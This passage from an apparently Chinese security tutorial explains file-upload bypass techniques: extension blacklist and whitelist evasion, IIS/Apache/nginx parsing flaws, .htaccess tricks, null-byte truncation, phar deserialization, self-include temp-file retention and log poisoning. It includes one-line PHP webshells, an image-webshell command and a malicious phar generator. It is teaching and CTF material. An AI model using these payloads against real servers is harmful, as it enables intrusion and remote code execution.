<span class="hljs-keyword">return</span> !<span class="hljs-keyword">$this</span>-&gt;binData||(strlen(<span class="hljs-keyword">$this</span>-&gt;binData) === <span class="hljs-number">0</span>);        &#125;    &#125;<span class="hljs-meta">?&gt;</span></code></pre><p>使用方法</p><p>随便找一个jpg图片,下载到本地保存为<code>1.jpg</code>.</p><p>使用脚本处理<code>1.jpg</code>,命令<code>php jpg_payload.php 1.jpg</code></p><p><img src="/2020/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210212221838208.png" alt="image-20210212221838208"></p><p>使用16进制编辑器打开,就可以看到插入的php代码.</p><p><img src="/2020/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210212221823008.png" alt="image-20210212221823008"></p><p>需要注意的是,有一些jpg图片不能被处理,所以要多尝试一些jpg图片.</p><h3 id="4-后缀校验"><a href="#4-后缀校验" class="headerlink" title="4.后缀校验"></a>4.后缀校验</h3><p><strong>原理</strong></p><p>取文件后缀名与服务端黑白名单进行比较</p><p><strong>绕过</strong></p><p>os系统特性、后缀名截取不规范、php代码缺陷、过滤不完全、配合伪协议解析图形文件</p><h4 id="1-黑名单绕过"><a href="#1-黑名单绕过" class="headerlink" title="1.黑名单绕过"></a>1.黑名单绕过</h4><p>windows下绕过</p><pre><code class="hljs awk">更换.htaccess偏门文件名和后缀名扩展名末尾添加空格、<span class="hljs-string">&#x27;_&#x27;</span>、<span class="hljs-string">&#x27;.&#x27;</span>、<span class="hljs-string">&#x27;::$DATA&#x27;</span>、大小写混写(linux下也可)、‘<span class="hljs-regexp">/’、‘.’、‘/</span>.’符号绕过<span class="hljs-string">&#x27;*=.&#x27;</span>、<span class="hljs-string">&#x27;&lt;=*&#x27;</span>、<span class="hljs-string">&#x27;&gt;=?&#x27;</span>、<span class="hljs-string">&#x27;test.&lt;&lt;&lt;&#x27;</span>test.php:<span class="hljs-number">1</span>.jpg会生成一个test.php的空文件不可绕过考虑phar:<span class="hljs-regexp">//</span>协议利用，若过滤配合(compress:<span class="hljs-regexp">//</span>)</code></pre><p>asp</p><pre><code class="hljs angelscript">解析漏洞:.asp;.jpg.asp.jpg.asp;jpg+<span class="hljs-number">111.</span>asp;+<span class="hljs-number">222.</span>jpg/<span class="hljs-number">111.</span>asp/<span class="hljs-number">1.</span>jpg/<span class="hljs-number">111.</span>aspx/<span class="hljs-number">1.</span>jpg后缀名：asa,cer,cdx,ashx,asmx,xml,htr,asax双文件扩展：test.asp.jpgRTLO：asp.html-内容为一句话php.txt-内容为一句话</code></pre><p>jsp</p><pre><code class="hljs css"><span class="hljs-selector-class">.jsp</span><span class="hljs-selector-class">.jpg</span><span class="hljs-selector-class">.jsp</span>#用两个<span class="hljs-selector-tag">jsp</span>包围中间的<span class="hljs-selector-tag">jpg</span>后缀名：<span class="hljs-selector-tag">jspf</span>,<span class="hljs-selector-tag">jspa</span>,<span class="hljs-selector-tag">jsps</span>,<span class="hljs-selector-tag">jspx</span></code></pre><p>php</p><pre><code class="hljs angelscript">后缀名：.php3 ,.php4,.php5,.php7大小写：pHp解析漏洞：<span class="hljs-number">1.</span>php.jpg<span class="hljs-number">1.</span>jpg.php<span class="hljs-number">1.</span>php  jpg(jpg前面两个空格)<span class="hljs-number">1.</span>php jpg(jpg前面一个空格)/<span class="hljs-number">1.</span>jpg/<span class="hljs-number">1.</span>php/<span class="hljs-number">1.</span>jpg%<span class="hljs-number">00.</span>php/<span class="hljs-number">1.</span>jpg/.php/<span class="hljs-number">1.</span>jpg/php特殊文件利用：.htaccess.user.ini</code></pre><p>以上一些脚本语言的解析漏洞再白名单中也实用</p><h5 id="htaccess（白名单也可）"><a href="#htaccess（白名单也可）" class="headerlink" title=".htaccess（白名单也可）"></a>.htaccess（白名单也可）</h5><pre><code class="hljs ada">.htaccess文件(或者<span class="hljs-string">&quot;分布式配置文件&quot;</span>）,全称是Hypertext <span class="hljs-keyword">Access</span>(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</code></pre><p>利用.htaccess的条件：Apache中配置<code>AllowOverride All</code></p><p>.htaccess文件可以配置将特定的文件按规定的文件类型进行解析，可以用以下两种方式来配置：</p><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;test&quot;</span>&gt;</span>  <span class="hljs-attribute"><span class="hljs-nomarkup">SetHandler</span></span> application/x-httpd-php<span class="hljs-section">&lt;/FilesMatch&gt;</span></code></pre><p>这一种采用正则匹配，只要文件名为test的文件都将被作为php文件解析</p><pre><code class="hljs applescript">AddType <span class="hljs-built_in">application</span>/x-httpd-php .jpg</code></pre><p>第二种是将.jpg文件都作为php文件解析</p><p>这样我们如果能将.htaccess上传到服务器的话，就可以再根据我们自己设定的规则来解析上传的文件，以此来绕过上传过滤</p><h5 id="利用工具进行fuzz"><a href="#利用工具进行fuzz" class="headerlink" title="利用工具进行fuzz"></a>利用工具进行fuzz</h5><p>工具：<a href="https://github.com/c0ny1/upload-fuzz-dic-builder">https://github.com/c0ny1/upload-fuzz-dic-builder</a> </p><p>生成fuzz的字典,执行命令:<code>python upload-fuzz-dic-builder.py -n test -a jpg -l php -m apache --os win -o upload_file.txt</code></p><p>把生成的字典导入burp中，同时取消payload-encoding的选中状态。执行后可以看到有些php文件上传成功。然后访问其中上传成功的文件，查看是否执行。</p><p><img src="/2020/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210212222524169.png" alt="image-20210212222524169"></p><p>访问如图中的地址文件，可以看到上传成功：</p><p><img src="/2020/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210212222545092.png" alt="image-20210212222545092"></p><h4 id="2-白名单绕过"><a href="#2-白名单绕过" class="headerlink" title="2.白名单绕过"></a>2.白名单绕过</h4><h5 id="1-00解析漏洞"><a href="#1-00解析漏洞" class="headerlink" title="1.00解析漏洞"></a>1.00解析漏洞</h5><p>这个多数被利用在截断路径，利用的条件是：</p><pre><code class="hljs apache"><span class="hljs-attribute">PHP</span> &lt; <span class="hljs-number">5</span>.<span class="hljs-number">3</span>.<span class="hljs-number">4</span><span class="hljs-attribute">magic_quotes_gpc</span> 关闭</code></pre><p>因为<code>0x00</code>是字符串的结束标志符，所以php在读取到<code>0x00</code>时就不会再往后读取，我们可以利用这些截断字符后面不需要的内容</p><p>注意的是<code>%00</code>是url编码，在以POST传参时应该使用burpsuite对其进行url decode，或者修改hex值为00；而当GET传参时因为浏览器会做一遍url decode，所以直接传<code>%00</code>即可。例：</p><pre><code class="hljs css"><span class="hljs-selector-tag">shell</span><span class="hljs-selector-class">.php</span>%00<span class="hljs-selector-class">.jpg</span>,<span class="hljs-selector-tag">shell</span><span class="hljs-selector-class">.php0xoo</span><span class="hljs-selector-class">.jpg</span></code></pre><h5 id="2-ascii-特殊字符包含"><a href="#2-ascii-特殊字符包含" class="headerlink" title="2.ascii 特殊字符包含"></a>2.ascii 特殊字符包含</h5><p>00 截断无效，尝试用 0x00~0xff 之内的 ascii 字符来截断。</p><p>burp 中发送数据包到 intruder 模块，将范围控制在 0~255 之间</p><p>用 intuder 模块的 payload 进行处理，先加上 % ，再进行 urldecode</p><p><img src="/2020/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210214015052201.png" alt="image-20210214015052201"></p><h5 id="3-webserver解析漏洞"><a href="#3-webserver解析漏洞" class="headerlink" title="3.webserver解析漏洞"></a>3.webserver解析漏洞</h5><p><strong>IIS</strong></p><pre><code class="hljs angelscript">IIS5.x<span class="hljs-number">-6.</span>x:<span class="hljs-number">1</span>、目录解析(<span class="hljs-number">6.0</span>):/<span class="hljs-number">1.</span>asp/<span class="hljs-number">1.</span>jpg 在<span class="hljs-number">1.</span>asp下的任意文件，服务器都解析为asp文件<span class="hljs-number">2</span>、文件解析:<span class="hljs-number">1.</span>asp;.jpg#分号后面的不被解析，也就是说<span class="hljs-number">1.</span>asp;.jpg会被服务器看成是<span class="hljs-number">1.</span>asp<span class="hljs-number">3</span>、文件类型:<span class="hljs-number">1.</span>asa,a.cer,<span class="hljs-number">1.</span>cdxIIS7<span class="hljs-number">.5</span>：IIS7<span class="hljs-number">.5</span>是由于php配置文件中，开启了cgi.fix_pathinf，当访问：http:<span class="hljs-comment">//test.com/a.jpg时，a.jpg会被当做php执行。</span></code></pre><p>Windows下图片马制作：<code>copy /b 正常图片.jpg + yijuhua.php yijuhua.jpg</code></p><p><strong>低版本apache解析漏洞</strong></p><pre><code class="hljs css"><span class="hljs-selector-tag">Apache</span>和<span class="hljs-selector-tag">php</span>三种结合方式：<span class="hljs-selector-tag">CGI</span>、<span class="hljs-selector-tag">Module</span>、<span class="hljs-selector-tag">FastCGI</span>，该解析漏洞只有在<span class="hljs-selector-tag">apache</span>和<span class="hljs-selector-tag">php</span>以<span class="hljs-selector-tag">Module</span>方式结合时才存在，而且<span class="hljs-selector-tag">Apache</span>还有一个特性：从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断后缀不识别：1<span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.php123</span>，而左边的<span class="hljs-selector-tag">php</span>可识别，就会被解析为<span class="hljs-selector-tag">php</span>文件配置错误：1<span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.jpg</span></code></pre><p><strong>CVE-2017-15715</strong></p><p>一个apache的解析漏洞就是CVE-2017-15715，这个漏洞利用方式就是上传一个文件名最后带有换行符(只能是<code>\x0A</code>，如上传a.php，然后在burp中修改文件名为<code>a.php\x0A</code>)，以此来绕过一些黑名单过滤</p><p>具体的漏洞分析可以看p牛：<a href="https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html">https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html</a></p><p><strong>nginx解析漏洞</strong></p><pre><code class="hljs angelscript">Nginx默认是以CGI的方式支持PHP解析的，和IIS7<span class="hljs-number">.5</span>一样开启了cgi.fix_pathinf<span class="hljs-number">1.</span>jpg/<span class="hljs-number">1.</span>php<span class="hljs-number">1.</span>jpg%<span class="hljs-number">00.</span>php<span class="hljs-number">1.</span>jpg/%<span class="hljs-number">20</span>\<span class="hljs-number">1.</span>php上传一个名字为test.jpg，以下内容的文件：‘);?&gt;  然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.phpNginx &lt;<span class="hljs-number">8.03</span>默认Fast-CGI开启状况下，上传一个木马文件为xxx.jpg，然后访问xxx.jpg/x.php，这个文件将以php进行解析Nginx <span class="hljs-number">0.5</span>.,<span class="hljs-number">0.6</span>, <span class="hljs-number">0.7</span> &lt;= <span class="hljs-number">0.7</span><span class="hljs-number">.65</span>, <span class="hljs-number">0.8</span> &lt;= <span class="hljs-number">0.8</span><span class="hljs-number">.37</span>Ngnix在遇到%<span class="hljs-number">00</span>空字节时与后端FastCGI处理不一致，导致可以在图片中嵌入PHP代码然后通过访问xxx.jpg%<span class="hljs-number">00.</span>php来执行其中的代码</code></pre><h4 id="3-文件包含"><a href="#3-文件包含" class="headerlink" title="3.文件包含"></a>3.文件包含</h4><p>利用条件：无法直接上传 shell，只能上传图片，存在文件包含</p><h5 id="1-phar"><a href="#1-phar" class="headerlink" title="1.phar"></a>1.phar</h5><p>phar 是 php 中的一种归档压缩文件，类似 zip 。可以使用 phar:// 协议来访问压缩后的文件。</p><p>PHP5.3之后支持了类似Java的jar包，名为phar。用来将多个PHP文件打包为一个文件。</p><p><strong>文件结构</strong></p><p>1.a stub：可以理解为一个标志，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p><p>2.a manifest describing the contents：phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以<strong>序列化</strong>的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p><p>3.the file contents：被压缩文件的内容。</p><p>4.[optional] a signature for verifying Phar integrity (phar file format only)：签名，放在文件末尾</p><h6 id="1-正常使用"><a href="#1-正常使用" class="headerlink" title="1.正常使用"></a>1.正常使用</h6><p>将 php 文件压缩成 zip 文件，zip 文件改后缀为相应的上传点要求文件后缀</p><p>例如上传点要求png，将下面的代码放在 1.php 中，压缩成 1.zip 并改名 1.png后上传</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">&#x27;1&#x27;</span>]);<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">&#x27;1&#x27;</span>]);<span class="hljs-meta">?&gt;</span>&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;    <span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">&#x27;1&#x27;</span>]);&lt;/script&gt;</code></pre><p>上传文件之后在右键 -&gt; 源代码中可以看到上传的地址，复制出来并用 phar:// 协议进行访问</p><p>访问：<code>path/x.php?str=phar://upload_path/1.png</code></p><h6 id="2-phar反序列化"><a href="#2-phar反序列化" class="headerlink" title="2.phar反序列化"></a>2.phar反序列化</h6><p><strong>原因</strong></p><p>phar反序列化漏洞的漏洞点在于使用phar://协议读取文件的时候，文件内容会被解析成phar对象，然后phar对象内的Metadata信息会被反序列化；当Metadata内容可由用户控制，则会存在反序列化漏洞风险。</p><p><strong>生成一个简单的phar</strong></p><p>php内置了一个Phar类来处理相关操作，但是要将php.ini中的<code>phar.readonly</code>选项设置为<code>Off</code>，否则无法生成phar文件。</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span> -&gt; data);    &#125;    &#125;@unlink(<span class="hljs-string">&quot;test.phar&quot;</span>);    $phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;test.phar&quot;</span>); <span class="hljs-comment">//后缀名必须为phar</span>    $phar-&gt;startBuffering();    $phar-&gt;setStub(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub</span>    $o = <span class="hljs-keyword">new</span> TestObject();    $o -&gt; data = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>; <span class="hljs-comment">//恶意内容</span>    $phar-&gt;setMetadata($o); <span class="hljs-comment">//将自定义的meta-data存入manifest</span>    $phar-&gt;addFromString(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span>    <span class="hljs-comment">//签名自动计算</span>    $phar-&gt;stopBuffering();<span class="hljs-meta">?&gt;</span></code></pre><p><strong>利用条件</strong></p><pre><code class="hljs angelscript"><span class="hljs-number">1.</span>phar文件要能够上传到服务器端。<span class="hljs-number">2.</span>要有可用的魔术方法作为“跳板”。<span class="hljs-number">3.</span>文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。</code></pre><p><strong>简单的例子</strong></p><p>假定上传点只能上传GIF，则对<strong>生成一个简单的phar</strong>中做一个简单的修改</p><pre><code class="hljs php">$phar -&gt; setStub(<span class="hljs-string">&#x27;GIF89a&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>); <span class="hljs-comment">//stub前面添加gif头，绕过文件幻数检测</span></code></pre><p>后台解析文件</p><pre><code class="hljs php">$filename=$_GET[<span class="hljs-string">&#x27;filename&#x27;</span>];<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AnyClass</span></span>&#123;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span> -&gt;data);    &#125;&#125;<span class="hljs-keyword">include</span> ($filename);</code></pre><p>然后执行我们的马生成test.phar文件，改后缀为gif，上传。</p><p>访问：<code>path/x.php?str=phar://upload_path/test.gif</code>即可</p><h5 id="2-php自包含特性"><a href="#2-php自包含特性" class="headerlink" title="2.php自包含特性"></a>2.php自包含特性</h5><p><strong>利用条件</strong></p><pre><code class="hljs angelscript"><span class="hljs-number">1.</span> 可控的文件包含点。<span class="hljs-number">2.</span> 目录遍历漏洞。（查看临时文件名）</code></pre><p><strong>php文件上传机制</strong></p><p>首先先了解一下php的全局数组$_FILES。</p><p>官方的解释：</p><blockquote><p>通过 HTTP POST 方式上传到当前脚本的项目的数组。通过使用 PHP 的全局数组 $_FILES，你可以从客户计算机向远程服务器上传文件。</p></blockquote><p>$_FILES 数组提供了多个内容在文件上传时使用，比较重要的有以下几个：</p><pre><code class="hljs markdown">$<span class="hljs-emphasis">_FILES[<span class="hljs-string">&#x27;myFile&#x27;</span>][<span class="hljs-symbol">&#x27;name&#x27;</span>] 客户端文件的原名称。 </span><span class="hljs-emphasis">$_</span>FILES[<span class="hljs-string">&#x27;myFile&#x27;</span>][<span class="hljs-symbol">&#x27;type&#x27;</span>] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如&quot;image/gif&quot;。 $<span class="hljs-emphasis">_FILES[<span class="hljs-string">&#x27;myFile&#x27;</span>][<span class="hljs-symbol">&#x27;size&#x27;</span>] 已上传文件的大小，单位为字节。 </span><span class="hljs-emphasis">$_</span>FILES[<span class="hljs-string">&#x27;myFile&#x27;</span>][<span class="hljs-symbol">&#x27;tmp_name&#x27;</span>] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload<span class="hljs-emphasis">_tmp_</span>dir 指定，默认是/tmp目录。</code></pre><ul><li>这里的重点就是<code>$_FILES[‘myFile’] [‘tmp_name’]</code>这个变量</li></ul><p>上传过程中还利用到了一个重要的函数move_uploaded_file()，该方法是将上传的文件移动到新位置，若不加上这一行代码，临时文件在上传周期后就被删除而不会被存储。</p><pre><code class="hljs php">move_uploaded_file(file,newloc)</code></pre><blockquote><p>本函数检查并确保由 file 指定的文件是合法的上传文件（即通过 PHP 的 HTTP POST 上传机制所上传的）。如果文件合法，则将其移动为由 newloc 指定的文件。</p></blockquote><p><strong>利用点</strong></p><p>在同一目录下创建两个文件，file_upload.html和upload.php</p><ul><li><p>file_upload.html</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;upload.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/formdata&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">lable</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>Filename:<span class="hljs-tag">&lt;/<span class="hljs-name">lable</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;upload_file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;subit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></li><li><p>upload.php</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;上传前的文件名: &quot;</span>.$_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>].<span class="hljs-string">&#x27;&lt;/&gt;&#x27;</span>;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;上传的临时文件名 : &quot;</span>.$_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>].<span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件类型: &quot;</span>.$_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>].<span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件大小: &quot;</span>.($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>]/<span class="hljs-number">1024</span>).<span class="hljs-string">&#x27; KB&lt;/br&gt;&#x27;</span>;    <span class="hljs-keyword">echo</span> move_uploaded_file($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],$_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<span class="hljs-meta">?&gt;</span></code></pre></li></ul><p>上传以后可以看到，tmp_name的命名规则是php[0-9A-Za-z]{3,4}，而且在上传过程中是被临时存储在/tmp目录下（wamp的环境）下。</p><p><img src="/2020/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210214005327863.png" alt="image-20210214005327863"></p><p>但是上传完成以后文件会自动被删除，所以在/tmp下找不到这个文件</p><p>那么我们要如何做到让阻止他将临时文件删除呢？这里就用到了自包含的特性，让存在php文件包含点的文件包含自己，让他产生一个相当于死循环的状态，在包含的过程中我们进行post文件上传操作。</p><pre><code class="hljs routeros">self_include.php?<span class="hljs-attribute">c</span>=self_include.php</code></pre><p>这样就会导致内存溢出，无法正常结束一个php上传周期，这时它会清空自己的内存堆栈，以便从错误中恢复过来，这时对临时文件的删除操作就无法完成，当跳出这个周期后，这个临时文件就以后缀名为tmp的形式保存在/tmp目录下。</p><p>这时候我们就利用存在包含点的php文件包含这个临时文件就行了。</p><p><strong>栗子</strong></p><p>测试环境：apache 2.4.9、php版本5.5.12</p><p>1.创建两个文件，一个为存在包含点的self_include.php，一个构造的文件上传点</p><p>self_include.php</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-keyword">include</span>($_GET[<span class="hljs-string">&#x27;c&#x27;</span>]);<span class="hljs-meta">?&gt;</span></code></pre><p>self_include.html</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;upload&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;./self_include.php?c=self_include.php&quot;</span>&gt;</span>        File: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><p>2.我们让他自包含和文件上传同时进行，这里上传一个phpinfo文件。</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> phpinfo(); <span class="hljs-meta">?&gt;</span></code></pre><p>当我们点击提交以后，发现他报错了</p><blockquote><p>Maximum function nesting level of ‘100’ reached, aborting!</p></blockquote><p><img src="/2020/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210214005948539.png" alt="image-20210214005948539"></p><p>这是因为在我本地装了xdebug插件，它默认只能trace 100条的信息，所以这里在php.ini的xdebug配置下加上一条：</p><pre><code class="hljs ini"><span class="hljs-attr">xdebug.max_nesting_level</span>=<span class="hljs-number">600</span></code></pre><p>这里测试过大约包含到150次左右程序就会崩溃，就会在tmp目录下生成我们需要的临时文件。</p><p>3.重启服务器，此时重新包含一次，提交</p><p><img src="/2020/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210214010026619.png" alt="image-20210214010026619"></p><p>可以看到这里生成了两个临时文件，说明这里经过了两个上传周期，之后php守护进程无法处理这种情况就会抛出一个无法访问异常。</p><p>4.之后就可以直接利用包含点，愉快的包含我们上传的文件了</p><p><img src="/2020/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210214010112458.png" alt="image-20210214010112458"></p><p>而在实战中不一定能知道文件存储路径，所以就需要目录遍历漏洞来找到临时文件的文件名</p><p>亦或者是知道路径，但不知道文件名，可以使用burp爆破出文件名。</p><p>在Windows下，由于FindFirstFile的特性，在不确定文件后面字符的情况下，可以使用&lt;&lt;结尾来匹配到这个文件，类似于*</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">9000</span><span class="hljs-regexp">/upload/</span>self_include.php?c=..<span class="hljs-regexp">/tmp/</span>php&lt;&lt;</code></pre><p><img src="/2020/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210214010543071.png" alt="image-20210214010543071"></p><p><strong>举一反三之包含日志</strong></p><p>访问一个不存在的文件时，会在服务器下的/log/access.log进行记录，我们可以通过url写入一个一句话来包含日志文件，从而getshell。</p><p>1.首先访问<a href="http://localhost:9000/">http://localhost:9000/</a><?php phpinfo();?>，记得这里需要使用bp来发包。</p><p><img src="/2020/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210214010723042.png" alt="image-20210214010723042"></p><ol start="2"><li>可以看到access.log文件记录下了我们访问的url。</li></ol><p><img src="/2020/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210214010744926.png" alt="image-20210214010744926"></p><ol start="3"><li>进行文件包含，成功包含了phpinfo文件。</li></ol><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">9000</span><span class="hljs-regexp">/upload/</span>self_include.php?c=..<span class="hljs-regexp">/logs/</span>access.log</code></pre><p><img src="/2020/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210214010831567.png" alt="image-20210214010831567"></p><p><strong>ctf题目</strong></p><p>题目链接：<a href="https://www.ichunqiu.com/battalion?t=1&amp;r=56951">https://www.ichunqiu.com/battalion?t=1&amp;r=56951</a></p><p>writeup链接：<a href="https://blog.csdn.net/qq_30123355/article/details/58165038">https://blog.csdn.net/qq_30123355/article/details/58165038</a></p><h5 id="3-反序列化上传"><a href="#3-反序列化上传" class="headerlink" title="3.反序列化上传"></a>3.反序列化上传</h5><p>这个也是来源于一道 ctf（jarvisoj phpinfo），题目地址</p><p><a href="http://web.jarvisoj.com:32784/">http://web.jarvisoj.com:32784/</a></p><p>附上详细的解答：</p><p><a href="https://blog.csdn.net/wy_97/article/details/78430690">https://blog.csdn.net/wy_97/article/details/78430690</a></p><h5 id="4-end函数缺陷"><a href="#4-end函数缺陷" class="headerlink" title="4.end函数缺陷"></a>4.end函数缺陷</h5><p><strong>原理</strong></p><p>end 函数原本的作用就是返回数组的最后一个元素，reset函数返回数组的第一个值。但是呢</p><p>end 函数取到的是给数组的最后一次赋值的那个值，reset 函数取的是第一个给数组赋值的值</p><p><img src="/2020/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210214013307015.png" alt="image-20210214013307015"></p><p><strong>栗子</strong></p><p>一道网鼎杯第二场的 wafUpload</p><p>先看一下 wafUpload 这道题：</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">?php</span></span><span class="hljs-tag">#$<span class="hljs-attr">sandbox</span> = <span class="hljs-string">&#x27;/var/www/html/upload/&#x27;</span> <span class="hljs-attr">.</span> <span class="hljs-attr">md5</span>(&quot;<span class="hljs-attr">phpIsBest</span>&quot; <span class="hljs-attr">.</span> $<span class="hljs-attr">_SERVER</span>[&#x27;<span class="hljs-attr">REMOTE_ADDR</span>&#x27;]);</span><span class="hljs-tag">$<span class="hljs-attr">sandbox</span> = <span class="hljs-string">&#x27;&#x27;</span>;</span><span class="hljs-tag"></span><span class="hljs-tag">#@<span class="hljs-attr">mkdir</span>($<span 